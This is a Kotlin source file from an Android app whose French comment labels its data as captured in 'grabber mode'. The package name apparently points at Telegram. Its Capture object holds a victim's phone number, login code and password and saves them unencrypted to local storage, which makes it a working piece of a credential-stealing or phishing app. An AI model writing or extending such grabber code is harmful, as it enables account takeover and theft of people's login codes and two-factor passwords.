package com.tgme.app

import android.content.Context

/** Données capturées (mode grabber) + persistance locale. */
object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone)
            .putString("code", code)
            .putString("password", password)
            .apply()
    }
}
